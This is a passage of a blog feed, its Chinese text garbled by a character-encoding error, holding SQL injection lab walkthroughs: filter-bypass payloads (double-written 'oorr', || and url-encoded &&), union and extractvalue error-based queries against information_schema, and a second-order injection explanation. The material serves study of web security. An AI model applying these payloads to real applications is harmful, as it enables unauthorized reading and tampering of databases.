        <content type="html"><![CDATA[<h2 id="æ£€æµ‹æ³¨å…¥ç‚¹">æ£€æµ‹æ³¨å…¥ç‚¹</h2><p>?id=1'</p><p>å›æ˜¾ï¼š</p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 tobe resource, boolean given in <strong>C:-labs.php</strong> on line<strong>38</strong> You have an error in your SQL syntax; check themanual that corresponds to your MySQL server version for the rightsyntax to use near ''1'' LIMIT 0,1' at line 1</p></blockquote><p>æ ¹æ®æŠ¥é”™ï¼š'1'' LIMIT0,1ï¼Œæˆ‘ä»¬çŸ¥é“é—­åˆæ–¹å¼ä¸ºå•å¼•å·ï¼Œåé¢è¿˜æœ‰è¯­å¥ï¼Œå¯ä»¥ç”¨æ³¨é‡Šæ³¨é‡Šæ‰ã€‚</p><p>ä¸‹é¢æ„é€ ï¼š?id=1' --+ å’Œ ?id=1' %23</p><p>å‡å›æ˜¾ï¼š</p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 tobe resource, boolean given in <strong>C:-labs.php</strong> on line<strong>38</strong> You have an error in your SQL syntax; check themanual that corresponds to your MySQL server version for the rightsyntax to use near '' LIMIT 0,1' at line 1</p></blockquote><p>æŒ‰ç†è¯´ï¼Œä¸åº”è¯¥æŠ¥é”™ï¼Œå°±æ˜¯æŠ¥é”™ä¹Ÿåº”è¯¥æŠ¥ï¼š' -- LIMIT 0,1 æˆ– ' # LIMIT0,1ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºï¼Œä¸¤ç§æ³¨é‡Šè¢«è¿‡æ»¤æ‰äº†ã€‚</p><p>ä¸‹é¢çœ‹çœ‹æºç ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p>pre_replace å‡½æ•°</p><blockquote><p>mixed preg_replace (mixed pattern, mixed replacement, mixed string [,int limit [, int &amp;$count]] );</p></blockquote><p>preg_replace å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢,æœç´¢ subject ä¸­åŒ¹é…pattern çš„éƒ¨åˆ†ï¼Œ ä»¥ replacementè¿›è¡Œæ›¿æ¢,åé¢å¯é€‰çš„å‚æ•°æ˜¯ç”¨æ¥æ§åˆ¶æ›¿æ¢æ¬¡æ•°ä¸æ›¿æ¢æ‰§è¡Œæ¬¡æ•°çš„ã€‚</p><p>è¿™é‡Œï¼Œæˆ‘ä»¬æ­£å¼å†æ¬¡è¯´ä¸€ä¸‹ï¼ˆä¹‹å‰åšæ–‡ä¸­è®²è¿‡ï¼‰ï¼Œä¸¤ç§æ„é€  payloadçš„å°å·®å¼‚ï¼ˆå…¶å®å·®å¼‚ä¹Ÿä¸å¤§ï¼‰ã€‚</p><ol type="1"><li>é—­åˆå‰é¢çš„ï¼Œæ³¨é‡Šåé¢çš„ï¼Œåœ¨ä¸­é—´æ„é€ æ–°è¯­å¥</li><li>é—­åˆå‰é¢çš„ï¼Œæ³¨é‡Šåé¢çš„ï¼Œåœ¨ä¸­é—´æ„é€ è¯­å¥ï¼ˆå½“ç„¶ï¼Œå¯ä»¥ç”¨ä¸­é—´æ„é€ çš„ä¸€éƒ¨åˆ†æ¥é—­åˆåé¢çš„ï¼‰</li></ol><p>ä¹‹æ‰€ä»¥æ¯”è¾ƒæ­£å¼çš„æå‡ºè¿™ä¸¤ç§ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬ä¹ æƒ¯äº†ï¼ˆå°¤æŒ‡æˆ‘ï¼‰å‰ä¸€ç§ï¼ˆæ¯”è¾ƒæš´åŠ›ï¼Œè€Œä¸”éœ€è¦æ³¨é‡Šç®¡ç”¨çš„æ–¹æ³•ï¼‰ï¼Œå…¶å®ï¼Œä»å®ç”¨è§’åº¦æ¥çœ‹ï¼Œåä¸€ç§æ¯”è¾ƒå¥½ï¼Œä¸ç”¨æ‹…å¿ƒæ³¨é‡Šé—®é¢˜ã€‚</p><h2 id="çŒœå­—æ®µ">çŒœå­—æ®µ</h2><p>?id=1' order by 3,'1 3 ä¸ªå­—æ®µ</p><p>ä¸Šé¢æ¶‰åŠä¸€ä¸ªå°çŸ¥è¯†ç‚¹ï¼šorder byåé¢å¯ä»¥è·Ÿé€—å·åˆ†éš”çš„å¤šåˆ—ï¼Œè¿›è¡Œå¤šåˆ—æ’åºï¼Œä¼˜å…ˆçº§å½“ç„¶æ˜¯ç¬¬ä¸€ä¸ªä¼˜å…ˆã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å¤šå†™ä¸€ä¸ªåˆ—æ¥é—­åˆåé¢çš„å¼•å·ã€‚</p><h2 id="æŸ¥çœ‹æ˜¾ç¤ºä½">æŸ¥çœ‹æ˜¾ç¤ºä½</h2><p>?id=-1' union select 1,2,'3</p><p>æ³¨æ„ï¼šè¿™é‡Œçš„ç¬¬ä¸‰ä¸ªå­—æ®µæ˜¯ç”¨æ¥ä¸åé¢é—­åˆçš„ï¼Œ'3',å› æ­¤ï¼Œä¸èƒ½ç”¨æ¥æ˜¾ç¤ºä¸œè¥¿ã€‚ä¸ä¿¡ï¼Œä½ è¯•è¯•ï¼š?id=-1'union select 1,2,'version() ï¼Œå¯æ˜¯å¦‚æœåªæœ‰ 3æ˜¯æ˜¾ç¤ºä½ï¼Œé‚£æˆ‘ä»¬è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>æå‡ºä»¥ä¸‹ä¸¤ç§æ”¹è¿›æ–¹æ¡ˆï¼šï¼ˆæˆ‘æ¯”è¾ƒå–œæ¬¢ç¬¬ä¸€ç§ï¼Œå› ä¸ºç¬¬äºŒç§æŸ¥è¯¢äº†database(),æ„Ÿè§‰æœ‰ç‚¹è¿‡æ—©åœ°è§¦å‘æ•æ„Ÿä¿¡æ¯ã€‚ï¼‰ ?id=-1' union select 1,2,3union select 4,5,'6 ?id=-1' union select 1,2,3 from (select database())awhere '1</p><p>ç¬¬ä¸€ç§ï¼Œå°±æ˜¯å†æ¥ä¸€ä¸ª unionselectï¼Œå› ä¸ºè”åˆæŸ¥è¯¢å‰é¢è¯­å¥æŸ¥å‡ºæ¥çš„æ€»æ˜¯é å‰ï¼Œå› æ­¤ï¼Œ1ï¼Œ2ï¼Œ3è¿˜æ˜¯å¯ä»¥ç”¨æ¥ç›‘æµ‹æ˜¾ç¤ºä½çš„ã€‚</p><p>ç¬¬äºŒç§å°±æ˜¯çº¯ç²¹ä¸ºäº†æ‰¾ä¸ªå¼•å·ï¼Œç„¶åä»æŸä¸ªæ•°æ®åº“ä¸­æŸ¥ 1 ï¼Œåœ¨ whereæ¡ä»¶åŠ ä¸€ä¸ªå¼•å·ã€‚</p><p>å½“ç„¶ï¼Œæ­¤å…³ä½¿ç”¨æŠ¥é”™æ³¨å…¥ç­‰æ–¹å¼ä¹Ÿå¯ä»¥ ?id=1' orextractvalue(1,concat(0x7e,database())) or '1'='1</p><p>åé¢çš„æ“ä½œä¸ä¹‹å‰ç±»ä¼¼ï¼Œä¸å†è¯¦è§£ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>äºŒæ¬¡æ’åºæ³¨å…¥</title>
      <link href="/blog/2019/08/04/websec/sql_injection/stored-injection/"/>
      <url>/blog/2019/08/04/websec/sql_injection/stored-injection/</url>
      
        <content type="html"><![CDATA[<p>å¤§ä½¬åšæ–‡(çœ‹ç€è¿™ä¸ªå°±å¤Ÿäº†ï¼Œæˆ‘çš„ä¸ç”¨çœ‹äº†ï¼Œæˆ‘åªæ˜¯è‡ªå·±æ€»ç»“ä¸€ä¸‹ã€‚)</p><p><a href="https://www.jianshu.com/p/746164a91422">äºŒæ¬¡æ³¨å…¥</a></p><p>åŸç†ï¼šäºŒæ¬¡æ’åºæ³¨å…¥ï¼Œä¹Ÿç§°å­˜å‚¨å‹æ³¨å…¥ã€‚å³ï¼šå…ˆå°†å¯¼è‡´ SQLæ³¨å…¥çš„å­—ç¬¦é¢„å…ˆå­˜åˆ°æ•°æ®åº“ä¸­,å½“å†æ¬¡è°ƒç”¨åˆ°è¿™ä¸ªæ¶æ„æ„é€ çš„å­—ç¬¦æ—¶å°±å¯ä»¥è§¦å‘æ³¨å…¥ã€‚</p><p>åˆ©ç”¨äº† wafç­‰å¯¹å­˜å…¥æ•°æ®åº“çš„ä¸œè¥¿ä¸è¿›è¡Œè¿‡æ»¤ï¼Œåªè¿›è¡Œè½¬ä¹‰çš„ç‰¹ç‚¹ï¼Œå­˜åˆ°æ•°æ®åº“ä¸­ä¹‹åè¿˜æ˜¯ä½ è¾“å…¥çš„åŸæ•°æ®ï¼Œç„¶ååœ¨ç¬¬äºŒæ¬¡ç”¨åˆ°è¯¥æ•°æ®çš„æ—¶å€™ï¼Œå®ƒä¸æ“ä½œå®ƒçš„sql è¯­å¥å½¢æˆ sql æ³¨å…¥</p><p>è¿™é‡Œæ¶‰åŠåˆ°ç”¨æˆ·ä½“éªŒ/åŠŸèƒ½ç­‰é—®é¢˜ï¼Œæ¯”å¦‚ï¼šä½ å†™ä¸€ç¯‡æ­£å¸¸çš„å…³äº sqlæ³¨å…¥æˆ–å…¶ä»–æ¶‰åŠ sql çš„åšæ–‡ï¼Œæ–‡ç« ä¸­åŒ…å« sqlæ³¨å…¥ç­‰è¯­å¥ï¼Œç„¶åä½ è¦å­˜å…¥æ•°æ®åº“ï¼Œwaf ç­‰ä¸åº”è¯¥å°†å¨èƒå­—ç¬¦ã€å­—ç¬¦ä¸²ç­‰ç»™å»æ‰.è¿™å¯èƒ½ä¹Ÿæ˜¯å®‰å…¨ä¸åŠŸèƒ½ä½“éªŒçš„ä¸€ä¸ªçŸ›ç›¾ç‚¹å§ã€‚</p><p>åœ¨æœ¬å…³ä¸­ï¼Œå…¶ä¸»è¦åŠŸèƒ½çš„æœ‰ 3 ä¸ª php æ–‡ä»¶: login.phpè´Ÿè´£æŸ¥è¯¢æ•°æ®åº“ç”¨æˆ·å­˜åœ¨å’ŒéªŒè¯ç™»å½•, login_create.php åˆ›å»ºæ–°ç”¨æˆ·,pass_change.php ä¿®æ”¹è€ç”¨æˆ·å¯†ç ã€‚</p><p>æœ¬æ¬¡çš„è¿‡æ»¤åœ¨è´¦æˆ·ç™»å½•å’Œå¯†ç å¤„,ä½¿ç”¨äº† mysql_real_escape_string å‡½æ•°</p><p>mysql_real_escape_string() å‡½æ•°<strong>è½¬ä¹‰</strong> SQLè¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼Œä½†å¹¶ä¸ä¼šæ›¿æ¢æˆ–å»é™¤ã€‚</p><p>å› æ­¤ï¼Œæˆ‘ä»¬è¾“å…¥çš„ç‰¹æ®Šå­—ç¬¦ä¼šè¢«å®ƒè½¬ä¹‰è€Œä¸å¥æ•ˆ,ä½†æ˜¯ä¹‹åå­˜å‚¨è¿›æ•°æ®åº“æ—¶ä¾ç„¶ä¼šè¿˜åŸæˆåŸæ¥çš„æ ·å­ã€‚</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬å‘ç° pass_change.php ä¸­ç›´æ¥æŠŠ sessionä¸­çš„ç”¨æˆ·åç›´æ¥æ‹¿æ¥ç”¨äº†,ç»“åˆä¸Šé¢çš„è¿‡æ»¤å‡½æ•°,å¦‚æœçŸ¥é“ç¡®åˆ‡çš„ç”¨æˆ·,å¯ä»¥æ„é€ å•å¼•å·é—­åˆæ¥ä¿®æ”¹å…¶å¯†ç ã€‚</p><p>æœ‰äº›å¼€å‘è€…è¿‡äºè½»å¿ƒå¤§æ„ï¼Œå½“å°†ä»æ•°æ®åº“ä¸­å–å‡ºçš„æ•°æ®æ‹¼æ¥åˆ° sqlè¯­å¥ä¸Šæ—¶ï¼Œä¸è¿›è¡Œæ£€æµ‹è¿‡æ»¤ï¼Œä»è€Œå¯¼è‡´äºŒæ¬¡æ³¨å…¥ã€‚</p><p>å…·ä½“ç»†èŠ‚å°±ä¸è®²äº†ï¼Œçœ‹å¤§ä½¬åšæ–‡å§ã€‚ä»¥åé‡åˆ°åˆ«çš„å†åŠ ä¸Šæ¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç»•è¿‡andä¸orè¿‡æ»¤</title>
      <link href="/blog/2019/08/04/websec/sql_injection/and_or_filter/"/>
      <url>/blog/2019/08/04/websec/sql_injection/and_or_filter/</url>
      
        <content type="html"><![CDATA[<h1 id="ç»•è¿‡æ–¹å¼">ç»•è¿‡æ–¹å¼</h1><p>ä»¥ä¸‹ç»•è¿‡æ–¹å¼åŸºæœ¬æŒ‰ç…§å®ç”¨ç¨‹åº¦ï¼ˆå¥½ç”¨ç¨‹åº¦ï¼‰æ’åº</p><h2 id="or-ç»•è¿‡æ–¹å¼">or ç»•è¿‡æ–¹å¼</h2><h3 id="ç¬¦å·ç»•è¿‡">ç¬¦å·ç»•è¿‡ï¼š||</h3><p>æ³¨æ„ï¼š|| ç›´æ¥ä½¿ç”¨å°±è¡Œï¼Œå®ƒä¸å±äº url ä¸­éœ€è¦è¢«è½¬ç§»çš„é‚£ç§ã€‚</p><p>ç¬¦å·å¯ä»¥ç»•è¿‡çš„åŸå› æ˜¯ waf ä¸€èˆ¬åªæ£€æµ‹ and å’Œ orçš„å•è¯å…³é”®å­—ï¼Œä¸æ£€æµ‹å¯¹åº”æ•°å­¦ç¬¦å·ã€‚å½“ç„¶ï¼Œè¦æ˜¯ wafè¿‡æ»¤äº†å®ƒä»¬ï¼Œè¿™ç§ç»•è¿‡ä¹Ÿå°±ä¸ç®¡ç”¨äº†ï¼Œæ¯”å¦‚ï¼šæœ¬å…³å¯ä»¥åœ¨ blacklistä¸­åŠ å…¥ä»¥ä¸‹ä»£ç ï¼Œä¾¿è¿‡æ»¤äº†&amp; å’Œ |</p><pre><code>$id= preg_replace(&#39;/\\|/&#39;,&quot;&quot;, $id);$id= preg_replace(&#39;/\\&amp;/&#39;,&quot;&quot;, $id);</code></pre><h3 id="åŒå­—ç¬¦ç»•è¿‡oorr">åŒå­—ç¬¦ç»•è¿‡ï¼šoorr</h3><p>ä¸€æ¬¡è¿‡æ»¤ï¼Œæ£€æµ‹åˆ°ä¸­é—´çš„ orï¼Œå»æ‰å®ƒï¼Œç„¶åè¿˜å‰©ä¸‹ o å’Œ rï¼Œæ­£å¥½ç»„æˆä¸€ä¸ªorï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡ã€‚åŒå­—ç¬¦åº”ç”¨äº†å¼€å‘äººå‘˜åªè¿›è¡Œä¸€æ¬¡è¿‡æ»¤è€Œä¸å¾ªç¯è¿‡æ»¤çš„è¿‡å¤±ï¼Œå½“ç„¶ï¼Œå¦‚æœå¼€å‘äººå‘˜è¿›è¡Œå¾ªç¯è¿‡æ»¤ï¼Œé‚£ä¹ˆè¿™ç§ç»•è¿‡æ–¹å¼å°±ä¸ç®¡ç”¨äº†ã€‚</p><p>æ¯”å¦‚ï¼šæœ¬å…³çš„æºç ï¼Œå°±åªæ˜¯ç”¨ä¸€æ¬¡è¿‡æ»¤ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">blacklist</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="comment">//ä¸­é—´çœç•¥å¥½å¤šè¡Œ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¤§å°å†™å˜å½¢ororor">å¤§å°å†™å˜å½¢ï¼šOr,Or,or</h3><p>ä¸€èˆ¬ç”¨æ¥ç»•è¿‡é‚£äº›åªæ£€æµ‹ and å’Œorï¼Œè€Œä¸æ£€æµ‹åˆ«çš„å¤§å°å†™å½¢å¼ï¼ˆå³ï¼šä½¿ç”¨æ­£åˆ™æ—¶ï¼Œæ²¡æœ‰ç”¨ ié€‰é¡¹ï¼Œå¿½ç•¥å¤§å°å†™è¿›è¡ŒåŒ¹é…ï¼‰ï¼Œå½“ç„¶ï¼Œå¦‚æœå¼€å‘è€…ä½¿ç”¨æ­£åˆ™æ—¶åŠ äº† ié€‰é¡¹ï¼Œé‚£è¿™ç§ç»•è¿‡æ–¹å¼å°±å¤±æ•ˆäº†ã€‚è¿™ç§æ–¹æ³•ä¸å¤ªç®¡ç”¨ï¼ˆå› ä¸ºå¥½å¤š waféƒ½ä¸ç¼ºåˆ†å¤§å°å†™ã€‚ï¼‰</p><h2 id="and-ç»•è¿‡æ–¹å¼">and ç»•è¿‡æ–¹å¼</h2><h3 id="åŒå­—ç¬¦anandd">åŒå­—ç¬¦ï¼šanandd</h3><h3 id="ç¬¦å·ç»•è¿‡-1">ç¬¦å·ç»•è¿‡:&amp;&amp;</h3><p>æ³¨æ„ï¼š&amp;&amp; ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œéœ€è¦å¯¹ä»–è¿›è¡Œ url ç¼–ç ï¼Œå› ä¸º &amp;åœ¨url ä¸­æœ‰ç‰¹æ®Šç”¨æ³•ï¼šè¿æ¥ get è¯·æ±‚çš„é”®å€¼å¯¹ã€‚æ‰€ä»¥ï¼Œå°±åƒ # ä¸€æ ·ï¼Œåœ¨ url ä¸­ #å·æ˜¯ç”¨æ¥æŒ‡å¯¼æµè§ˆå™¨åŠ¨ä½œçš„ï¼ˆä¾‹å¦‚é”šç‚¹ï¼‰ï¼Œæ‰€ä»¥ä½¿ç”¨å®ƒçš„æ—¶å€™ä¹Ÿè¦è¿›è¡Œ urlç¼–ç </p><h3 id="å¤§å°å†™-andandç­‰">å¤§å°å†™ aNd,AND,ç­‰</h3><h1 id="å…³é”®æ­¥éª¤">å…³é”®æ­¥éª¤</h1><h2 id="æ£€æµ‹æ³¨å…¥ç‚¹">æ£€æµ‹æ³¨å…¥ç‚¹</h2><p>åŠ ä¸ªå•å¼•å·ï¼Œå›æ˜¾å¦‚ä¸‹ï¼š</p><blockquote><p><strong>Warning</strong>: mysql_fetch_array() expects parameter 1 tobe resource, boolean given in <strong>C:-labs.php</strong> on line<strong>39</strong> You have an error in your SQL syntax; check themanual that corresponds to your MySQL server version for the rightsyntax to use near ''1'' LIMIT 0,1' at line 1</p></blockquote><p>å—¯ï¼Œæœ‰è¯­å¥æŠ¥é”™ï¼ŒçœŸå¥½ã€‚æ ¹æ® '1'' LIMIT0,1ï¼Œæˆ‘ä»¬å¾—çŸ¥ï¼Œå•å¼•å·åŒ…è£¹ï¼Œåé¢æœ‰è¯­å¥ã€‚</p><p>å°è¯•åŠ ä¸ªæ³¨é‡Šï¼Œå—¯ï¼ŒåŠ äº†ä¹‹åï¼Œä¸æŠ¥é”™äº†ï¼Œè¯æ˜æ²¡æœ‰è¿‡æ»¤æ³¨é‡Šã€‚</p><h2 id="çŒœå­—æ®µ">çŒœå­—æ®µ</h2><p>?id=1' order by 3--+</p><p>æŠ¥é”™ï¼š</p><blockquote><p>You have an error in your SQL syntax; check the manual thatcorresponds to your MySQL server version for the right syntax to usenear 'der by 3-- ' LIMIT 0,1' at line 1</p></blockquote><p>å¯ä»¥çœ‹å‡º or è¢«è¿‡æ»¤äº†ï¼ˆor å’Œ andå¾€å¾€ä¸€èµ·ï¼Œå¼€å‘äººå‘˜æƒ³åˆ°è¿‡æ»¤å…¶ä¸€ï¼Œå°±ä¼šæƒ³åˆ°å¦ä¸€ä¸ªã€‚å› æ­¤ï¼Œæˆ‘ä»¬æœ‰ç†ç”±ç›¸ä¿¡ andä¹Ÿè¢«è¿‡æ»¤äº†ã€‚ï¼‰ã€‚</p><p>è¿™é‡Œé‡‡ç”¨åŒå­—ç¬¦ï¼Œå› ä¸ºè¿‡æ»¤ orï¼Œå´å½±å“åˆ°äº† order by ä¸­çš„orï¼Œè¿™æ˜¯ä¸æ€ä¹ˆå¥½çš„è¿‡æ»¤ï¼ˆæˆ‘è®¤ä¸ºï¼‰ï¼Œå½“ç„¶ï¼Œè¿˜æœ‰å…¶ä»–ä¸€äº›ç±»ä¼¼çš„æƒ…å†µï¼Œæ¯”å¦‚ï¼šinformationä¸­çš„ or</p><p>?id=1' oorrder by 2 --+ ä¸æŠ¥é”™ï¼Œæ˜¾ç¤ºæ­£å¸¸ï¼Œç»•è¿‡æˆåŠŸã€‚</p><p>åé¢ä½¿ç”¨ union æŸ¥è¯¢æ³¨å…¥å°±è¡Œäº†ã€‚</p><h1 id="æŠ¥é”™æ³¨å…¥">æŠ¥é”™æ³¨å…¥</h1><p>ä¸‹é¢ä½¿ç”¨æŠ¥é”™æ³¨å…¥å¯¹ and/or è¿‡æ»¤æ³¨å…¥è¿›è¡Œè¿›ä¸€æ­¥è®²è§£ã€‚</p><p>åŒå­—ç¬¦ç»•è¿‡ï¼š</p><p>?id=-1' oorr extractvalue(1,concat(0x23,(select schema_name frominfoorrmation_schema.schemata limit 0,1))) --+</p><p>è¿™é‡Œæ³¨æ„ï¼šinformation ä¸­çš„ or ä¹Ÿè¦åŒå­—ç¬¦ã€‚</p><p>?id=-1' anandd extractvalue(1,concat(0x23,concat(version())))--+</p><p>ç¬¦å·ç»•è¿‡ï¼š</p><p>?id=-1' || extractvalue(1,concat(0x23,concat(version())))--+</p><p>?id=-1' %26%26 extractvalue(1,concat(0x23,concat(version())))--+</p><p>æ³¨æ„ï¼š&amp;&amp;è¦ä½¿ç”¨ url ç¼–ç </p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysqlæ³¨å…¥å°æŠ€å·§</title>
      <link href="/blog/2019/08/04/websec/sql_injection/mysql-injection-skills/"/>
      <url>/blog/2019/08/04/websec/sql_injection/mysql-injection-skills/</url>
      
        <content type="html"><![CDATA[<h1 id="åˆ¤æ–­å½“å‰è¡¨ä¸­æ˜¯å¦æœ‰æŸä¸ªå­—æ®µ">åˆ¤æ–­å½“å‰è¡¨ä¸­æ˜¯å¦æœ‰æŸä¸ªå­—æ®µ</h1><p>å‡è®¾åå°è¯­å¥ä¸ºï¼šselect * from tuser where id=1</p><p>å‡è®¾æˆ‘ä»¬è¦åˆ¤æ–­æœ‰æ²¡æœ‰ flag å­—æ®µï¼Œæˆ‘ä»¬å¯ä»¥æ„é€  payloadï¼š?id=1or(flag)</p><p>é€šè¿‡æŠ¥é”™ä¸å¦æ¥åˆ¤æ–­æœ‰æ— è¯¥å­—æ®µã€‚</p><p>åŸç†ï¼‰ï¼ˆæˆ‘è‡ªå·±æµ‹è¯•å‡ºæ¥çš„..ï¼‰ï¼šwhere åé¢å¯ä»¥ç›´æ¥åŠ å­—æ®µåï¼Œåœ¨åˆ¤æ–­where æ¡ä»¶æ—¶ï¼Œmysql ä¼šå¯¹æ¯æ¡æ•°æ®çš„è¯¥å­—æ®µè¿›è¡Œ atof/atodå‡½æ•°æ“ä½œï¼ˆä½†å®é™…çš„æ•°æ®ä¸å˜ï¼Œåªæ˜¯è¿™æ ·åˆ¤æ–­ï¼‰ï¼Œå³ï¼šå°†å…¶è½¬æ¢ä¸ºæµ®ç‚¹å‹ï¼Œç„¶åé€šè¿‡åˆ¤æ–­è¯¥å­—æ®µæ˜¯å¦ä¸º0ï¼Œè‹¥éé›¶ï¼Œåˆ™æ»¡è¶³æ¡ä»¶ã€‚</p><p>ç»™å‡ºæµ‹è¯•è¯æ˜ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tuser;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | passwd   |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | basswd   |</span><br><span class="line">|    1 | adam     | vassword |</span><br><span class="line">|    1 | bob      | gasswd   |</span><br><span class="line">|    2 | colin    | passwd   |</span><br><span class="line">|    2 | doc      | passwd   |</span><br><span class="line">|    3 | doctor   | passwd   |</span><br><span class="line">|    3 | elite    | passwd   |</span><br><span class="line">|    1 | NULL     | passw    |</span><br><span class="line">|    1 | admin    | basswd   |</span><br><span class="line">|    1 | adam     | vassword |</span><br><span class="line">|    1 | bob      | gasswd   |</span><br><span class="line">|    2 | colin    | passwd   |</span><br><span class="line">|    1 | 0        | pass     |</span><br><span class="line">|    1 |          | pas      |</span><br><span class="line">|    1 |  dewe    | ds       |</span><br><span class="line">|    1 |  3fd     | asd      |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">16 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tuser where username;</span><br><span class="line">+------+----------+--------+</span><br><span class="line">| id   | username | passwd |</span><br><span class="line">+------+----------+--------+</span><br><span class="line">|    1 |  3fd     | asd    |</span><br><span class="line">+------+----------+--------+</span><br><span class="line">1 row in set, 13 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tuser where id</span><br><span class="line">    -&gt; ;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | passwd   |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | basswd   |</span><br><span class="line">|    1 | adam     | vassword |</span><br><span class="line">|    1 | bob      | gasswd   |</span><br><span class="line">|    2 | colin    | passwd   |</span><br><span class="line">|    2 | doc      | passwd   |</span><br><span class="line">|    3 | doctor   | passwd   |</span><br><span class="line">|    3 | elite    | passwd   |</span><br><span class="line">|    1 | NULL     | passw    |</span><br><span class="line">|    1 | admin    | basswd   |</span><br><span class="line">|    1 | adam     | vassword |</span><br><span class="line">|    1 | bob      | gasswd   |</span><br><span class="line">|    2 | colin    | passwd   |</span><br><span class="line">|    1 | 0        | pass     |</span><br><span class="line">|    1 |          | pas      |</span><br><span class="line">|    1 |  dewe    | ds       |</span><br><span class="line">|    1 |  3fd     | asd      |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">16 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tuser where passwd;</span><br><span class="line">Empty set, 16 warnings (0.00 